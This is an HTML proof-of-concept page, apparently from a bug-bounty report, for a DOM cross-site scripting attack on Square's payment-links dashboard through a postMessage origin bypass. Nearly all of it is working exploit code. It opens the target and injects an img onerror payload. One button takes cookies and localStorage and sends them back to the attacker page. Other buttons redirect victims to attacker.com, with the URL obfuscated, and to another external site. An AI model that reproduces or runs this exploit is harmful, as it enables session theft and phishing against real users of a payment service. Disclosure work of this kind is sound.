<!DOCTYPE html>
<html>
<head>
    <title>Square DOM XSS PoC</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: #1a1a2e;
            color: #fff;
            min-height: 100vh;
            padding: 40px 20px;
        }
        .container {
            max-width: 700px;
            margin: 0 auto;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #888;
            margin-bottom: 30px;
        }
        .target {
            background: rgba(255,255,255,0.1);
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 25px;
            font-family: monospace;
            font-size: 13px;
        }
        .buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 25px;
        }
        button {
            padding: 14px 24px;
            font-size: 14px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            opacity: 0.9;
        }
        .btn-open { background: #3498db; color: white; }
        .btn-alert { background: #e74c3c; color: white; }
        .btn-steal { background: #9b59b6; color: white; }
        .btn-phish { background: #e67e22; color: white; }
        .status {
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 20px;
            background: rgba(46, 213, 115, 0.2);
            border: 1px solid #2ed573;
            display: none;
        }
        .status.show { display: block; }
        .stolen-data {
            display: none;
            margin-top: 20px;
            background: rgba(255,71,87,0.1);
            border: 1px solid #ff4757;
            border-radius: 8px;
            padding: 20px;
        }
        .stolen-data h3 {
            color: #ff4757;
            margin-bottom: 15px;
            font-size: 14px;
        }
        .stolen-data pre {
            background: #0a0a0a;
            padding: 15px;
            border-radius: 5px;
            overflow: auto;
            max-height: 400px;
            font-size: 11px;
            color: #2ed573;
        }
        .info {
            margin-top: 30px;
            padding: 20px;
            background: rgba(255,255,255,0.05);
            border-radius: 8px;
            font-size: 13px;
            color: #888;
        }
        .info code {
            background: rgba(255,255,255,0.1);
            padding: 2px 6px;
            border-radius: 4px;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Square DOM XSS PoC</h1>
        <p class="subtitle">postMessage Origin Bypass + Sanitization Bypass</p>

        <div class="target">
            Target: app.squareup.com/dashboard/payment-links/new
        </div>

        <div class="buttons">
            <button class="btn-open" onclick="openTarget()">1. Open Target</button>
            <button class="btn-alert" onclick="sendAlert()">2. XSS Alert</button>
            <button class="btn-steal" onclick="sendSteal()">3. Steal Data</button>
            <button class="btn-phish" onclick="sendPhish()">4. Redirect</button>
            <button class="btn-phish" onclick="sendTopRedirect()">5. Top Redirect</button>
        </div>

        <div class="status" id="status"></div>

        <div class="stolen-data" id="stolenData">
            <h3>Exfiltrated Data:</h3>
            <pre id="dataDisplay"></pre>
        </div>

        <div class="info">
            <strong>Steps:</strong><br>
            1. Click "Open Target" and wait for page to load<br>
            2. Choose an attack: Alert (PoC), Steal Data, or Phishing<br><br>
        </div>
    </div>

<script>
var targetWindow = null;

window.addEventListener('message', function(e) {
    if (e.data && e.data.stolen) {
        document.getElementById('stolenData').style.display = 'block';
        document.getElementById('dataDisplay').textContent = JSON.stringify(e.data.stolen, null, 2);
        showStatus('Data exfiltrated successfully!');
    }
    if (e.data && e.data.creds) {
        document.getElementById('stolenData').style.display = 'block';
        document.getElementById('dataDisplay').textContent = 'CAPTURED CREDENTIALS:\n\nEmail: ' + e.data.creds.email + '\nPassword: ' + e.data.creds.password;
        showStatus('Credentials captured!');
    }
});

function showStatus(msg) {
    var el = document.getElementById('status');
    el.textContent = msg;
    el.className = 'status show';
}

function openTarget() {
    showStatus('Opening target...');
    targetWindow = window.open('https://app.squareup.com/dashboard/payment-links/new');
    if (!targetWindow) {
        showStatus('Popup blocked! Allow popups and try again.');
        return;
    }
    showStatus('Target opened. Wait for page to load, then choose an attack.');
}

function sendPayload(xss) {
    if (!targetWindow || targetWindow.closed) {
        showStatus('Open target first!');
        return;
    }

    var payload = {
        name: 'LINK_PREVIEW',
        data: {
            type: 'INITIALIZE',
            uuid: 'poc-' + Date.now(),
            data: {
                checkout_link: {
                    id: 'l',
                    link_type: 'ITEM_LINK',
                    checkout_link_data: {
                        name: 'P',
                        link_type: 'ITEM_LINK',
                        order_details: {
                            line_items: [{ item_id: 'i', quantity: { quantity: 1 } }]
                        }
                    }
                },
                related_objects: [{
                    type: 'ITEM',
                    id: 'i',
                    item_data: {
                        name: 'Product',
                        description_html: '',
                        description: '<img src=x onerror="' + xss + '">',
                        variations: [{
                            type: 'ITEM_VARIATION',
                            id: 'v',
                            item_variation_data: {
                                item_id: 'i',
                                name: 'D',
                                pricing_type: 'FIXED_PRICING',
                                price_money: { amount: 100, currency: 'USD' }
                            }
                        }]
                    }
                }],
                settings: { checkout_title: 'Store' }
            }
        }
    };

    for (var i = 0; i < 10; i++) {
        try { targetWindow.frames[i].postMessage(payload, '*'); } catch(e) {}
    }
}

function sendAlert() {
    showStatus('Sending XSS alert...');
    sendPayload('alert(document.domain)');
}


function sendSteal() {
    showStatus('Stealing data...');
    var xss = 'var d={domain:document.domain,cookies:document.cookie,localStorage:JSON.stringify(localStorage),bootstrap:window.bootstrap};';
    xss += 'var o=top.opener;if(o){o.postMessage({stolen:d},String.fromCharCode(42));}';
    sendPayload(xss);
}

function sendPhish() {
    showStatus('Redirecting to attacker.com...');
    var xss = 'location.href=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109)';
    sendPayload(xss);
}

function sendTopRedirect() {
    showStatus('Redirecting main window to daemoon.me...');
    var xss = 'top.location="https://daemoon.me"';
    sendPayload(xss);
}
</script>

</body>
</html>
